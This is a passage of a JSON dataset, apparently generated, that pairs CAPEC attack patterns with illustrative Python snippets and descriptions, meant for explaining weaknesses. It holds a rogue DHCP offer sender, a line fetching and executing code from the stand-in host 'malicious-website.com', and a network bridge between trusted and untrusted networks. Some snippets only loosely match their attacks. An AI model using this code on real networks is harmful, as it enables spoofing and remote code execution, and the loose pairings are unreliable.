        "code_snippet": "import socket\n\n# Simulate a malicious DHCP server\nclass MaliciousDHCPServer:\n    def __init__(self, ip, port):\n        self.ip = ip\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind((self.ip, self.port))\n\n    def send_dhcp_offer(self, target_ip, target_mac):\n        # Craft a fake DHCP offer packet\n        dhcp_offer = b'\\x02' + b'\\x01' + b'\\x06' + b'\\x00'  # Message type, hardware type, hardware address length, hops\n        dhcp_offer += b'\\x00' * 4  # Transaction ID\n        dhcp_offer += b'\\x00' * 2  # Seconds elapsed\n        dhcp_offer += b'\\x00' * 2  # Bootp flags\n        dhcp_offer += socket.inet_aton(target_ip)  # Client IP address\n        dhcp_offer += socket.inet_aton(self.ip)  # Your (server) IP address\n        dhcp_offer += socket.inet_aton('0.0.0.0')  # Next server IP address\n        dhcp_offer += socket.inet_aton('0.0.0.0')  # Relay agent IP address\n        dhcp_offer += target_mac  # Client MAC address\n        dhcp_offer += b'\\x00' * 10  # Client hardware address padding\n        dhcp_offer += b'\\x00' * 64  # Server host name\n        dhcp_offer += b'\\x00' * 128  # Boot file name\n        dhcp_offer += b'\\x63\\x82\\x53\\x63'  # Magic cookie\n        dhcp_offer += b'\\x35\\x01\\x02'  # Option: DHCP Message Type (Offer)\n        dhcp_offer += b'\\xff'  # End Option\n\n        # Send the fake DHCP offer\n        self.sock.sendto(dhcp_offer, (target_ip, 68))\n\n# Example usage\nmalicious_server = MaliciousDHCPServer('192.168.1.100', 67)\nmalicious_server.send_dhcp_offer('192.168.1.101', b'\\x00\\x0c\\x29\\x3e\\x1c\\x2b')",
        "description": "This Python code snippet simulates a malicious DHCP server that sends a fake DHCP offer to a target machine. The MaliciousDHCPServer class binds to a specified IP and port, and the send_dhcp_offer method crafts and sends a fake DHCP offer packet to the target IP and MAC address. This embodies the main idea of DHCP Spoofing (CAPEC-290), where an adversary masquerades as a legitimate DHCP server to redirect network traffic or deny service. The code also touches on related CWEs, such as improper restriction of communication channels (CWE-923), authentication bypass by spoofing (CWE-290), and reliance on IP address for authentication (CWE-291)."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import requests\nimport os\nimport importlib.util\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_extension.py'\nresponse = requests.get(url)\n\n# Save the downloaded file\nwith open('malicious_extension.py', 'wb') as file:\n    file.write(response.content)\n\n# CWE-426: Untrusted Search Path\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nspec = importlib.util.spec_from_file_location('malicious_extension', 'malicious_extension.py')\nmalicious_extension = importlib.util.module_from_spec(spec)\nspec.loader.exec_module(malicious_extension)\n\n# CWE-507: Trojan Horse\n# CWE-506: Embedded Malicious Code\nmalicious_extension.execute_malicious_code()",
        "description": "This Python code snippet demonstrates the concept of 'Install Malicious Extension' by downloading and executing a malicious extension. The code downloads a Python script from an untrusted source (CWE-494) and saves it locally. It then loads and executes the downloaded script using an untrusted search path (CWE-426) and includes functionality from an untrusted control sphere (CWE-829). The downloaded script contains a function that executes malicious code, representing a Trojan Horse (CWE-507) with embedded malicious code (CWE-506). This snippet highlights the risks of installing and executing code from untrusted sources without proper integrity checks."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import os\nimport time\nimport random\n\n# Simulate sensitive data being displayed on a monitor\nsensitive_data = 'Sensitive Information: User Password = 12345'\n\n# Function to simulate electromagnetic emissions (EME) from a monitor\n# This is a simplified representation and does not actually emit EME\n\ndef emit_eme(data):\n    for char in data:\n        # Simulate a delay to represent data being displayed on the monitor\n        time.sleep(random.uniform(0.01, 0.1))\n        # Simulate EME by printing the character (in reality, this would be captured by an attacker)\n        print(char, end='', flush=True)\n\n# Function to simulate an attacker capturing EME\n# This is a simplified representation and does not actually capture EME\n\ndef capture_eme():\n    captured_data = ''\n    while True:\n        # Simulate capturing data from EME (in reality, this would be done using specialized equipment)\n        captured_data += os.read(0, 1).decode('utf-8')\n        if len(captured_data) >= len(sensitive_data):\n            break\n    return captured_data\n\n# Simulate the monitor emitting EME\nemit_eme(sensitive_data)\n\n# Simulate the attacker capturing the EME\ncaptured_data = capture_eme()\n\n# Display the captured data\nprint('\\nCaptured Data:', captured_data)",
        "description": "This Python code snippet simulates the concept of 'Eavesdropping on a Monitor' by representing the emission and capture of electromagnetic emissions (EME) from a monitor displaying sensitive information. The 'emit_eme' function simulates the monitor displaying sensitive data, while the 'capture_eme' function represents an attacker capturing this data through EME. The code highlights the vulnerability of sensitive information being exposed through physical side channels (CWE-1300) and the potential for unauthorized data capture without direct access to the system. This example is a simplified representation and does not perform actual EME emission or capture."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "import socket\n\nclass NetworkBridge:\n    def __init__(self, trusted_ip, untrusted_ip, port):\n        self.trusted_ip = trusted_ip\n        self.untrusted_ip = untrusted_ip\n        self.port = port\n\n    def create_channel(self):\n        try:\n            # Create a socket to connect to the trusted network\n            trusted_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            trusted_socket.connect((self.trusted_ip, self.port))\n\n            # Create a socket to connect to the untrusted network\n            untrusted_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            untrusted_socket.connect((self.untrusted_ip, self.port))\n\n            # Bridge the two networks\n            while True:\n                data = trusted_socket.recv(1024)\n                if not data:\n                    break\n                untrusted_socket.sendall(data)\n\n                data = untrusted_socket.recv(1024)\n                if not data:\n                    break\n                trusted_socket.sendall(data)\n        except Exception as e:\n            print(f\"Error: {e}\")\n        finally:\n            trusted_socket.close()\n            untrusted_socket.close()\n\n# Example usage\nbridge = NetworkBridge('192.168.1.10', '10.0.0.10', 8080)\nbridge.create_channel()",
        "description": "This Python code snippet demonstrates a basic implementation of a network bridge that connects a trusted network to an untrusted network. The `NetworkBridge` class initializes with the IP addresses of the trusted and untrusted networks and a port number. The `create_channel` method establishes sockets to both networks and continuously transfers data between them, effectively bridging the two networks. This code embodies the main idea of the CAPEC 'Network Boundary Bridging' by creating a channel that bridges trusted and untrusted networks. The code is vulnerable to several weaknesses: it does not verify the identity of the endpoints (CWE-923, CWE-300), does not ensure message integrity (CWE-924), and mixes trusted and untrusted data (CWE-501)."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "import socket\nimport threading\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-830: Inclusion of Web Functionality from an Untrusted Source\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-345: Insufficient Verification of Data Authenticity\n\n# Simulate a simple web server that includes a remote desktop session from an untrusted source\nclass SimpleWebServer:\n    def __init__(self, host='0.0.0.0', port=8080):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(5)\n        print(f'Server listening on {self.host}:{self.port}')\n\n    def handle_client(self, client_socket):\n        # CWE-830: Including remote desktop session from an untrusted source\n        response = \"\"\"HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html>\n<body>\n<h1>Remote Desktop Session</h1>\n<iframe src='http://untrusted-source.com/remote-desktop' width='800' height='600'></iframe>\n</body>\n</html>\"\"\"\n        client_socket.sendall(response.encode('utf-8'))\n        client_socket.close()\n\n    def start(self):\n        while True:\n            client_socket, addr = self.server_socket.accept()\n            print(f'Accepted connection from {addr}')\n            client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))\n            client_handler.start()\n\nif __name__ == '__main__':\n    server = SimpleWebServer()\n    server.start()",
        "description": "This Python code snippet represents a simple web server that listens for incoming connections and serves a web page containing an iframe. The iframe includes a remote desktop session from an untrusted source, which embodies the main idea of the 'Browser in the Middle (BiTM)' attack described in the CAPEC. The code also demonstrates several related CWEs:\n\n1. CWE-602: The server relies on the client to enforce security by including an iframe from an untrusted source.\n2. CWE-830: The iframe includes web functionality from an untrusted domain, potentially granting control to the untrusted source.\n3. CWE-294: The code does not implement any authentication mechanism, making it susceptible to capture-replay attacks.\n4. CWE-345: The server does not verify the authenticity of the included remote desktop session, accepting it without validation.\n\nThis code is a simplified example to illustrate the vulnerabilities and should not be used in a production environment."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "class DebugComponent:\n    def __init__(self, authorized=False):\n        self.authorized = authorized\n        self.debug_functions = ['read_registers', 'write_registers', 'inject_errors']\n\n    def access_debug_function(self, function_name):\n        if function_name in self.debug_functions:\n            if self.authorized:\n                return f'Accessing {function_name}'\n            else:\n                return 'Unauthorized access attempt detected'\n        else:\n            return 'Invalid debug function'\n\n# Example usage\n# Unauthorized access to debug function\nunauthorized_debug = DebugComponent(authorized=False)\nprint(unauthorized_debug.access_debug_function('read_registers'))\n\n# Authorized access to debug function\nauthorized_debug = DebugComponent(authorized=True)\nprint(authorized_debug.access_debug_function('write_registers'))",
        "description": "This Python code snippet defines a `DebugComponent` class that simulates the access control mechanism for hardware debug functions. The class has an `authorized` attribute to indicate whether the user is authorized to access debug functions. The `access_debug_function` method checks if the requested debug function is valid and whether the user is authorized to access it. If the user is not authorized, it returns an 'Unauthorized access attempt detected' message. This snippet embodies the main idea of the CAPEC by demonstrating how incorrect chaining or granularity of debug components can lead to unauthorized access to debug functionality. The related CWEs are represented by the potential for unauthorized access and the need for proper access control mechanisms."
    }
]